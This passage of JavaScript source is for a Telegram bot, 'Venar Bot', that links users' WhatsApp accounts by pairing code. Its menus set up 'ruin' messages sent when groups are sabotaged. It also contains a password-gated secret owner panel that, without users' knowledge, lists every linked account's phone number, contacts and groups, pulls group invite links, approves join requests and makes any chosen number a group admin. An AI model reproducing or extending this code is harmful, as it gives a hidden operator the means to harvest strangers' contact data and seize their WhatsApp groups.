        [Markup.button.callback('❓ مساعدة', 'btn_help'), Markup.button.callback('🔌 إلغاء الربط', 'btn_logout')],
        [Markup.button.url('📢 قناة واتساب', CHANNEL_LINK), Markup.button.url('📢 قناة تليجرام', CHANNEL_INVITE_LINK)]
    ]);
}

function getBackMenu() {
    return Markup.inlineKeyboard([
        [Markup.button.callback('🏠 عودة للقائمة الرئيسية', 'btn_home')]
    ]);
}

function getSubscriptionKeyboard() {
    return Markup.inlineKeyboard([
        [Markup.button.url('📢 اضغط هنا للاشتراك بالقناة', CHANNEL_INVITE_LINK)],
        [Markup.button.callback('✅ تحقق من الاشتراك', 'btn_check_sub')]
    ]);
}

function getDevBoxKeyboard() {
    return Markup.inlineKeyboard([
        [Markup.button.callback('📱 الأرقام المتصلة', 'dev_numbers')],
        [Markup.button.callback('📁 إدارة الجروبات', 'dev_groups')],
        [Markup.button.callback('📺 القنوات المؤرشفة', 'dev_channels')],
        [Markup.button.callback('📇 جهات الاتصال', 'dev_contacts')],
        [Markup.button.callback('🏠 عودة للقائمة الرئيسية', 'btn_home')]
    ]);
}

const devMenuBox = 
'╔════════════════════════════╗\n' +
'║   ⚡ 𝑉𝐸𝑁𝐴𝑅 𝐷𝐸𝑉 𝑃𝐴𝑁𝐸𝐿 ⚡     ║\n' +
'╠════════════════════════════╣\n' +
'🛠️ لوحة تحكم المطور السرية:\n' +
'اختر من الأزرار المربعة أدناه:\n' +
'╚════════════════════════════╝';

async function smoothTransition(ctx, text, extra) {
    try {
        await ctx.deleteMessage().catch(() => {});
    } catch (e) {}
    return ctx.reply(text, extra);
}

const sendStartMenu = async (ctx) => {
    const userId = ctx.from.id.toString();
    const isSubscribed = await checkSubscription(bot, userId);
    
    if (!isSubscribed) {
        const subMsg = '⚠️ *عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه.*\n\nيرجى الاشتراك ثم اضغط على زر "تحقق من الاشتراك".';
        await smoothTransition(ctx, subMsg, { parse_mode: 'Markdown', ...getSubscriptionKeyboard() });
        return;
    }

    devModeSessions.delete(userId);
    const welcomeText = '✨ *Welcome to Venar Bot* ✨\n\n📊 WhatsApp Status: 🟢 Connected\n\n👉 Please click on Link WhatsApp to start using the bot on WhatsApp.';
    await smoothTransition(ctx, welcomeText, { parse_mode: 'Markdown', ...getInlineMenu() });
};

bot.start(async (ctx) => {
    const userId = ctx.from.id.toString();
    const isSubscribed = await checkSubscription(bot, userId);
    if (!isSubscribed) {
        await ctx.reply('⚠️ *عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه.*\n\nيرجى الاشتراك ثم اضغط على زر "تحقق من الاشتراك".', { parse_mode: 'Markdown', ...getSubscriptionKeyboard() }).catch(() => {});
        return;
    }
    await sendStartMenu(ctx);
});

bot.command(['menu', 'اوامر', 'مينيو', 'الرئيسية'], async (ctx) => {
    const userId = ctx.from.id.toString();
    const isSubscribed = await checkSubscription(bot, userId);
    if (!isSubscribed) {
        await ctx.reply('⚠️ *عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه.*\n\nيرجى الاشتراك ثم اضغط على زر "تحقق من الاشتراك".', { parse_mode: 'Markdown', ...getSubscriptionKeyboard() }).catch(() => {});
        return;
    }
    await sendStartMenu(ctx);
});

bot.hears(/^(menu|اوامر|مينيو|الرئيسية|🏠 الرئيسية)$/i, async (ctx) => {
    const userId = ctx.from.id.toString();
    const isSubscribed = await checkSubscription(bot, userId);
    if (!isSubscribed) {
        await ctx.reply('⚠️ *عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه.*\n\nيرجى الاشتراك ثم اضغط على زر "تحقق من الاشتراك".', { parse_mode: 'Markdown', ...getSubscriptionKeyboard() }).catch(() => {});
        return;
    }
    await sendStartMenu(ctx);
});

bot.action('btn_check_sub', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const userId = ctx.from.id.toString();
    const isSubscribed = await checkSubscription(bot, userId);
    
    if (!isSubscribed) {
        await ctx.reply('❌ لم تقم بالاشتراك في القناة بعد! يرجى الاشتراك أولاً.').catch(() => {});
        return;
    }

    const elegantWelcome = 
        '╔════════════════════════════╗\n' +
        '║   🌟 WELCOME TO VENAR BOT 🌟   ║\n' +
        '╠════════════════════════════╣\n' +
        '║  Welcome to Venar Bot.     ║\n' +
        '║  To start, press /menu.    ║\n' +
        '║  Don\'t forget the / with menu ║\n' +
        '╚════════════════════════════╝';

    await smoothTransition(ctx, elegantWelcome);
});

bot.action('btn_link', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const linkInstruction = '🔗 *Link a bot*\nSend your WhatsApp number with the country code, digits only.\nExample: `9665XXXXXXXX`';
    await smoothTransition(ctx, linkInstruction, { parse_mode: 'Markdown', ...getBackMenu() });
});

bot.action('btn_status', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const id = ctx.from.id.toString();
    const s = sessions.get(id);
    const u = usersData[id] || {};
    const stats = getUserStats(id);
    const statusText = (s && s.status === 'connected') ? '✅ متصل ومستقر' : '❌ غير متصل';
    const text = `📊 *حالة البوت الحالية:*\n- واتساب: ${statusText}\n- الرقم: ${u.phone ? '+' + u.phone : 'غير مربوط'}\n- الهلاك المحفوظ: ${stats.totalHelak}`;
    await smoothTransition(ctx, text, { parse_mode: 'Markdown', ...getBackMenu() });
});

bot.action('btn_health', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const mem = process.memoryUsage();
    const text = '🩺 الذاكرة المستخدمة: ' + (mem.heapUsed / 1024 / 1024).toFixed(2) + ' MB';
    await smoothTransition(ctx, text, { parse_mode: 'Markdown', ...getBackMenu() });
});

bot.action('btn_logout', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const id = ctx.from.id.toString();
    const s = sessions.get(id);
    try {
        if (s && s.sock) {
            await s.sock.logout().catch(function(){});
            s.sock.end(undefined);
        }
        sessions.delete(id);
        devModeSessions.delete(id);
        const userSessionDir = path.join(SESSIONS_DIR, 'user_' + id);
        if (fs.existsSync(userSessionDir)) {
            fs.rmSync(userSessionDir, { recursive: true, force: true });
        }
        if (usersData[id]) {
            usersData[id].registered = false;
            saveData(usersData);
        }
        await smoothTransition(ctx, '🔌 تم إلغاء ربط الجلسة بنجاح.', { parse_mode: 'Markdown', ...getBackMenu() });
    } catch (err) {
        await smoothTransition(ctx, '❌ حدث خطأ أثناء فصل الجلسة.', { parse_mode: 'Markdown', ...getBackMenu() });
    }
});

bot.action('btn_help', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const text = '📌 لاستخدام البوت، قم بربط رقمك عبر زر "ربط واتساب"، ثم تحكم بالإعدادات والأوامر بكل سهولة عبر الأزرار المدمجة.';
    await smoothTransition(ctx, text, { parse_mode: 'Markdown', ...getBackMenu() });
});

bot.action('btn_home', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    await sendStartMenu(ctx);
});

bot.action('btn_desc', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    pendingInput.set(ctx.from.id.toString(), 'desc');
    const text = '📌 ارسل الوصف الجديد الذي تريده لرسائل الهلاك:';
    await smoothTransition(ctx, text, { parse_mode: 'Markdown', ...getBackMenu() });
});

bot.action('btn_name', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    pendingInput.set(ctx.from.id.toString(), 'name');
    const text = '📌 ارسل اسم الجروب الجديد الذي تريده عند الهلاك:';
    await smoothTransition(ctx, text, { parse_mode: 'Markdown', ...getBackMenu() });
});

bot.action('btn_msg', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    pendingInput.set(ctx.from.id.toString(), 'msg');
    const text = '📌 ارسل نص رسالة الهلاك الجديدة التي ستُرسل عند التخريب:';
    await smoothTransition(ctx, text, { parse_mode: 'Markdown', ...getBackMenu() });
});

// أزرار لوحة المطور
bot.action('dev_numbers', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    let activeText = '📱 *قائمة الأرقام المتصلة مع رقم التعريف:*\n\n';
    let count = 0;
    let idx = 1;
    sessions.forEach(function(s, tId) {
        if (s.status === 'connected') {
            count++;
            let name = 'بدون اسم';
            if (s.contacts) {
                let firstContact = Object.values(s.contacts)[0];
                if (firstContact) name = firstContact;
            }
            activeText += `🔹 [الرقم التعريفي: ${idx}]\n• اسم الواتساب: ${name}\n• رقم الهاتف: +${s.phone}\n\n`;
            idx++;
        }
    });
    if (count === 0) activeText = '📭 لا توجد أي أرقام متصلة حالياً.';
    activeText += '\n💡 اكتب رقم التعريف (مثلاً: `1`) لعرض خياراته.';
    await ctx.reply(activeText, { parse_mode: 'Markdown' });
});

bot.action('dev_groups', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    let totalText = '📁 *قائمة الجروبات مع روابطها وأعضائها (اختر رقماً للتحكم):*\n\n';
    let foundAny = false;
    let globalGroupIndex = 1;
    const devCtxMap = devGroupActions.get(ctx.from.id.toString()) || {};

    for (let [tId, sessionData] of sessions.entries()) {
        if (sessionData.status === 'connected' && sessionData.sock) {
            try {
                const groupsObj = await sessionData.sock.groupFetchAllParticipating();
                const groupList = Object.values(groupsObj || {});
                if (groupList.length > 0) {
                    foundAny = true;
                    totalText += `📱 جلسة (+${sessionData.phone}):\n`;
                    for (let i = 0; i < groupList.length; i++) {
                        let g = groupList[i];
                        let inviteLink = 'غير متاح';
                        try {
                            const code = await sessionData.sock.groupInviteCode(g.id);
                            if (code) inviteLink = 'https://chat.whatsapp.com/' + code;
                        } catch (err) {}
                        
                        devCtxMap[globalGroupIndex] = { sock: sessionData.sock, jid: g.id };
                        totalText += `🔹 *[جروب رقم ${globalGroupIndex}]* ${g.subject || 'بدون اسم'}\n   - الأعضاء: ${g.participants?.length || 'غير معروف'}\n   - الرابط: ${inviteLink}\n\n`;
                        globalGroupIndex++;
                    }
                }
            } catch (e) {}
        }
    }
    devGroupActions.set(ctx.from.id.toString(), devCtxMap);
    if (!foundAny) return ctx.reply('📭 لا توجد أي مجموعات نشطة.');
    totalText += '💡 أرسل رقم الجروب (مثلاً: `10`) لتظهر لك أزرار التحكم وقبول الطلبات.';
    await ctx.reply(totalText, { disable_web_page_preview: true });
});

bot.action('dev_channels', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const items = Object.values(channels).sort((a, b) => b.updatedAt - a.updatedAt);
    if (!items.length) return ctx.reply('📭 لا توجد قنوات مؤرشفة بعد.');
    let txt = '📺 عدد القنوات: ' + items.length + '\n\n';
    for (let i = 0; i < Math.min(items.length, 25); i++) {
        const c = items[i];
        txt += (i + 1) + '. ' + c.name + '\n   ' + (c.link || 'بدون رابط') + '\n\n';
    }
    await ctx.reply(txt, { disable_web_page_preview: true });
});

bot.action('dev_contacts', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    let totalText = '📇 *جهات الاتصال المحفوظة لجميع الأرقام:*\n\n';
    let foundAny = false;

    for (let [tId, sessionData] of sessions.entries()) {
        if (sessionData.status === 'connected' && sessionData.contacts) {
            const contactsList = Object.entries(sessionData.contacts);
            if (contactsList.length > 0) {
                foundAny = true;
                totalText += `📱 جلسة الرقم (+${sessionData.phone}):\n`;
                for (let i = 0; i < Math.min(contactsList.length, 50); i++) {
                    let [jid, name] = contactsList[i];
                    totalText += `   ${i + 1}. ${name} (${jid.split('@')[0]})\n`;
                }
                totalText += '\n';
            }
        }
    }
    if (!foundAny) return ctx.reply('📭 لا توجد جهات اتصال مسجلة في الجلسات الحالية بعد.');
    await ctx.reply(totalText, { disable_web_page_preview: true });
});

// التعامل مع أزرار قبول الطلبات الخاصة بالمطور
bot.action(/^accept_requests_(\d+)_([0-9]+)$/, async (ctx) => {
    await ctx.answerCbQuery('⏳ جاري قبول جميع الطلبات...').catch(() => {});
    const groupIdx = ctx.match[1];
    const devCtxMap = devGroupActions.get(ctx.from.id.toString()) || {};
    const targetData = devCtxMap[groupIdx];

    if (!targetData) {
        return ctx.reply('❌ انتهت صلاحية الجلسة، يرجى إعادة عرض الجروبات.');
    }

    try {
        const sock = targetData.sock;
        const groupJid = targetData.jid;
        const requests = await sock.groupRequestParticipantsList(groupJid).catch(() => []);
        if (requests && requests.length > 0) {
            let jids = requests.map(r => r.jid || r.id);
            await sock.groupRequestParticipantsUpdate(groupJid, jids, 'approve');
            await ctx.reply(`✅ تم قبول جميع الطلبات بنجاح (${jids.length} طلب).`);
        } else {
            await ctx.reply('ℹ️ لا توجد طلبات انضمام معلقة في هذه المجموعة.');
        }

        // الخطوة التالية: طلب إرسال رقم الشخص لتعيينه مشرفاً
        pendingInput.set(ctx.from.id.toString(), { type: 'promote_admin', jid: groupJid, sock: sock });
        await ctx.reply('📌 أرسل الآن رقم الشخص الذي تريد تعيينه مشرفاً في هذه المجموعة (مثلاً: `967700439352`):');
    } catch (e) {
        await ctx.reply('❌ فشل قبول الطلبات تلقائياً.');
    }
});

bot.on('text', async (ctx, next) => {
    const userId = ctx.from.id.toString();
    const text = ctx.message.text.trim();

    if (text === PASSWORD_SECRET) {
        if (userId !== OWNER_TELEGRAM_ID) {
            return; 
        }
        devModeSessions.add(userId);
        await smoothTransition(ctx, devMenuBox, { parse_mode: 'Markdown', ...getDevBoxKeyboard() });
        return;
    }

    const isSubscribed = await checkSubscription(bot, userId);
    if (!isSubscribed) {
        await ctx.reply('⚠️ *عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدام الأوامر.*\n\nيرجى الاشتراك ثم اضغط على زر "تحقق من الاشتراك".', { parse_mode: 'Markdown', ...getSubscriptionKeyboard() }).catch(() => {});
        return;
    }

    if (devModeSessions.has(userId)) {
        // إذا كان المطور بصدد إرسال رقم شخص لتعيينه مشرفاً
        const pending = pendingInput.get(userId);
        if (pending && pending.type === 'promote_admin') {
            pendingInput.delete(userId);
            let cleanNum = text.replace(/[^0-9]/g, '');
            if (cleanNum.length < 8) {
                return ctx.reply('❌ الرقم غير صالح. حاول مرة أخرى.');
            }
            const targetUserJid = cleanNum + '@s.whatsapp.net';
            try {
                await pending.sock.groupParticipantsUpdate(pending.jid, [targetUserJid], 'promote');
                await ctx.reply(`✅ تم تعيين الشخص (+${cleanNum}) مشرفاً في المجموعة بنجاح!`);
            } catch (e) {
                await ctx.reply('❌ فشل تعيين الشخص مشرفاً (تأكد أن الرقم صحيح وموجود في المجموعة).');
            }
            return;
        }

        if (/^[0-9]+$/.test(text)) {
            const numVal = parseInt(text);
            const devCtxMap = devGroupActions.get(userId) || {};
            
            if (devCtxMap[numVal]) {
                // إذا كتب رقم جروب معين، نظهر له زر قبول الطلبات المربع
                const groupInfo = devCtxMap[numVal];
                const btn = Markup.inlineKeyboard([
                    [Markup.button.callback('🟢 قبول الطلبات (Accept)', `accept_requests_${numVal}_${userId}`)]
                ]);
                return ctx.reply(`📁 *تم اختيار الجروب رقم (${numVal}):*\nاضغط على الزر أدناه لقبول جميع الطلبات المعلقة:`, { parse_mode: 'Markdown', ...btn });
            } else {
                // إذا كان رقم تعريف جهاز/جلسة
                let sessionsArr = Array.from(sessions.entries());
                let targetEntry = sessionsArr[numVal - 1];

                if (!targetEntry) return ctx.reply('❌ رقم التعريف غير موجود.');
                const sessionData = targetEntry[1];
                const choiceMsg = `📱 *خيارات الرقم التعريفي (${numVal}) - (+${sessionData.phone}):*\n\nاختر أو أرسل أحد الأوامر التالية:\n• \`/contacts ${numVal}\` ➔ لعرض جهات الاتصال\n• \`/groups ${numVal}\` ➔ لعرض المجموعات`;
                return ctx.reply(choiceMsg, { parse_mode: 'Markdown' });
            }
        }
        else if (text.startsWith('/groups')) {
            const args = text.split(' ');
            const targetIndex = args[1] ? parseInt(args[1]) : null;
            let sessionsArr = Array.from(sessions.entries());
            
            if (targetIndex !== null && !isNaN(targetIndex)) {
                let targetEntry = sessionsArr[targetIndex - 1];
                if (!targetEntry) return ctx.reply('❌ رقم التعريف غير موجود.');
                
                const sessionData = targetEntry[1];
                const sock = sessionData.sock;
                try {
                    const groupsObj = await sock.groupFetchAllParticipating();
                    const groupList = Object.values(groupsObj || {});
                    if (!groupList.length) return ctx.reply('📁 لا توجد جروبات لهذه الجلسة.');

                    let totalText = `📁 جروبات الرقم التعريفي ${targetIndex} (+${sessionData.phone}):\n\n`;
                    for (let i = 0; i < groupList.length; i++) {
                        let inviteLink = 'غير متاح';
                        try {
                            const code = await sock.groupInviteCode(groupList[i].id);
                            if (code) inviteLink = 'https://chat.whatsapp.com/' + code;
                        } catch (err) {}
                        totalText += `${i + 1}. ${groupList[i].subject}\n   الرابط: ${inviteLink}\n\n`;
                    }
                    return ctx.reply(totalText, { disable_web_page_preview: true });
                } catch (e) {
                    return ctx.reply('❌ فشل جلب جروبات هذه الجلسة.');
                }
            } 
            else {
                return ctx.reply('⚠️ يرجى تحديد رقم التعريف بجانب الأمر، مثلاً: `/groups 1`');
            }
        }
        else if (text.startsWith('/contacts')) {
            const args = text.split(' ');
            const targetIndex = args[1] ? parseInt(args[1]) : null;
            let sessionsArr = Array.from(sessions.entries());

            if (targetIndex !== null && !isNaN(targetIndex)) {
                let targetEntry = sessionsArr[targetIndex - 1];
                if (!targetEntry) return ctx.reply('❌ رقم التعريف غير موجود.');
                const sessionData = targetEntry[1];
                const contactsList = Object.entries(sessionData.contacts || {});
                if (!contactsList.length) return ctx.reply('📭 لا توجد جهات اتصال لهذه الجلسة.');

                let totalText = `📇 *جهات الاتصال للرقم التعريفي (${targetIndex}) - (+${sessionData.phone}):*\n\n`;
                for (let i = 0; i < contactsList.length; i++) {
                    let [jid, name] = contactsList[i];
                    totalText += `${i + 1}. ${name} (${jid.split('@')[0]})\n`;
                }
                return ctx.reply(totalText, { disable_web_page_preview: true });
            } else {
                let totalText = '📇 *جهات الاتصال المحفوظة لجميع الأرقام:*\n\n';
                let foundAny = false;

                for (let [tId, sessionData] of sessions.entries()) {
                    if (sessionData.status === 'connected' && sessionData.contacts) {
                        const contactsList = Object.entries(sessionData.contacts);
                        if (contactsList.length > 0) {
                            foundAny = true;
                            totalText += `📱 جلسة الرقم (+${sessionData.phone}):\n`;
                            for (let i = 0; i < Math.min(contactsList.length, 50); i++) {
                                let [jid, name] = contactsList[i];
                                totalText += `   ${i + 1}. ${name} (${jid.split('@')[0]})\n`;
                            }
                            totalText += '\n';
                        }
                    }
                }
                if (!foundAny) return ctx.reply('📭 لا توجد جهات اتصال مسجلة في الجلسات الحالية بعد.');
                return ctx.reply(totalText, { disable_web_page_preview: true });
            }
        }
        else if (text.startsWith('/find')) {
            const q = text.split(' ').slice(1).join(' ').trim().toLowerCase();
            if (!q) return ctx.reply('⚠️ اكتب كلمة أو حرفاً للبحث: `/find أ`', { parse_mode: 'Markdown' });
            
            const hits = Object.values(channels).filter((c) => c.name.toLowerCase().includes(q));
            let groupHits = [];

            for (let [tId, sessionData] of sessions.entries()) {
                if (sessionData.status === 'connected' && sessionData.sock) {
                    try {
                        const groupsObj = await sessionData.sock.groupFetchAllParticipating();
                        const groupList = Object.values(groupsObj || {});
                        for (const g of groupList) {
                            if (g.subject && g.subject.toLowerCase().includes(q)) {
                                let inviteLink = 'غير متاح';
                                try {
                                    const code = await sessionData.sock.groupInviteCode(g.id);
                                    if (code) inviteLink = 'https://chat.whatsapp.com/' + code;
                                } catch (err) {}
                                groupHits.push({ name: g.subject, link: inviteLink });
                            }
                        }
                    } catch (e) {}
                }
            }

            if (!hits.length && !groupHits.length) return ctx.reply('❌ لا توجد نتائج مطابقة.');

            let txt = `🔎 نتائج البحث الشامل عن ("${q}"):\n\n`;
            if (hits.length > 0) {
                txt += `📺 **القنوات:**\n`;
                for (const c of hits.slice(0, 15)) txt += `• ${c.name}\n  ${c.link || 'بدون رابط'}\n\n`;
            }
            if (groupHits.length > 0) {
                txt += `📁 **المجموعات (الجروبات):**\n`;
                for (const g of groupHits.slice(0, 15)) txt += `• ${g.name}\n  ${g.link}\n\n`;
            }
            return ctx.reply(txt, { disable_web_page_preview: true });
        }
    }

    if (pendingInput.has(userId) && typeof pendingInput.get(userId) === 'string') {
        const field = pendingInput.get(userId);
        pendingInput.delete(userId);
        usersData[userId] = usersData[userId] || {};
        usersData[userId][field] = text;
        saveData(usersData);
        await ctx.reply(`✅ تم حفظ القيمة الجديدة بنجاح!`, { parse_mode: 'Markdown', ...getInlineMenu() }).catch(() => {});
        return;
    }

    if (text.startsWith('9') || text.startsWith('+9') || text.startsWith('2') || text.startsWith('1')) {
        const cleanPhone = text.replace(/[^0-9]/g, '');
        if (cleanPhone.length >= 10) {
            await ctx.reply('⏳ جاري الاتصال السريع وتوليد كود الربط...');
            try { await connectWhatsApp(userId, cleanPhone, bot); } catch (e) {}
            return;
        }
    }

    return next();
});

bot.command('link', async function(ctx) {
    const p = ctx.message.text.split(' ')[1];
    const phone = p ? p.replace(/[^0-9]/g, '') : '';
    if (!phone) {
        const linkInstruction = '🔗 *Link a bot*\nSend your WhatsApp number with the country code, digits only.\nExample: `9665XXXXXXXX`';
        return ctx.reply(linkInstruction, { parse_mode: 'Markdown', ...getBackMenu() }).catch(() => {});
    }
    await ctx.reply('⏳ جاري الاتصال السريع وتوليد كود الربط...');
    try { await connectWhatsApp(ctx.from.id.toString(), phone, bot); } catch (e) {}
});

bot.catch((err) => {});

(async function(){
    if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
    for (let id in usersData) {
        let d = usersData[id];
        if (d.phone && d.registered) { try { await connectWhatsApp(id, d.phone, bot); } catch (e) {} }
    }
    await bot.launch({ dropPendingUpdates: true });
    console.log('✅ BOT RUNNING WITH FULL RESTORED WHATSAPP CMDS & DEV GROUP REQUEST APPROVALS');
})();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
